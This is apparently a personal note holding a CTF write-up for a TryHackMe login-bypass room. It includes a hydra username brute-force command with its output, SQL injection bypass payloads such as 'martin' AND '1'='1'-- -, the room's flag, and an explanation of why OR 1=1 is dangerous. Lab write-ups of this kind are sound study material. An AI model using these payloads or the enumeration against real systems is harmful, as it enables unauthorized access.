----
Have you learned your lesson?
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/a6a36a91747be09047869b809dce926d.png)
### Task 1  Find the Flag

 Start Machine

This is a relatively easy machine that tries to teach you a lesson, but perhaps you've already learned the lesson? Let's find out.

Treat this box as if it were a real target and not a CTF.  

Get past the login screen and you will find the flag. There are no rabbit holes, no hidden files, just a login page and a flag. Good luck!

Target: http://MACHINE_IP/

Answer the questions below

```
https://twitter.com/0xTib3rius/status/1623734218302930946

https://portswigger.net/web-security/sql-injection#:~:text=return%20all%20items.-,Warning,-Take%20care%20when

#### Warning

Take care when injecting the condition `OR 1=1` into a SQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an `UPDATE` or `DELETE` statement, for example, this can result in an accidental loss of data.

┌──(witty㉿kali)-[~/Downloads]
└─$ hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p test 10.10.48.41 http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password."
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-01 10:49:01
[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
[DATA] attacking http-post-form://10.10.48.41:80/:username=^USER^&password=^PASS^:Invalid username and password.
[80][http-post-form] host: 10.10.48.41   login: martin   password: test
[80][http-post-form] host: 10.10.48.41   login: patrick   password: test
[80][http-post-form] host: 10.10.48.41   login: stuart   password: test
[80][http-post-form] host: 10.10.48.41   login: marcus   password: test
[80][http-post-form] host: 10.10.48.41   login: kelly   password: test
[80][http-post-form] host: 10.10.48.41   login: arnold   password: test
[80][http-post-form] host: 10.10.48.41   login: Martin   password: test
[80][http-post-form] host: 10.10.48.41   login: karen   password: test
[80][http-post-form] host: 10.10.48.41   login: Patrick   password: test

martin' AND '1'='1'-- -
any

THM{aab02c6b76bb752456a54c80c2d6fb1e}
Well done! You bypassed the login without deleting the flag!

If you're confused by this message, you probably didn't even try an SQL injection using something like OR 1=1. Good for you, you didn't need to learn the lesson.

For everyone else who had to reset the box...lesson learned?

Using OR 1=1 is risky and should rarely be used in real world engagements. Since it loads all rows of the table, it may not even bypass the login, if the login expects only 1 row to be returned. Loading all rows of a table can also cause performance issues on the database. However, the real danger of OR 1=1 is when it ends up in either an UPDATE or DELETE statement, since it will cause the modification or deletion of every row.

For example, consider that after logging a user in, the application re-uses the username input to update a user's login status: UPDATE users SET online=1 WHERE username='<username>';

A successful injection of OR 1=1 here would cause every user to appear online. A similar DELETE statement, possibly to delete prior session data, could wipe session data for all users of the application.

Consider using AND 1=1 as an alternative, with a valid input (in this case a valid username) to test / confirm SQL injection. 

or

test' union select null-- -

The username check solely verifies the presence of a single row resulting from the query. With the remaining portion of the query commented out, the password check is absent as well. Since UNION makes no sense in a DELETE statement, it got skipped too.
```

![[Pasted image 20230829211658.png]]
![[Pasted image 20230901095237.png]]

What's the flag?

*THM{aab02c6b76bb752456a54c80c2d6fb1e}*



[[Windows Reversing Intro]]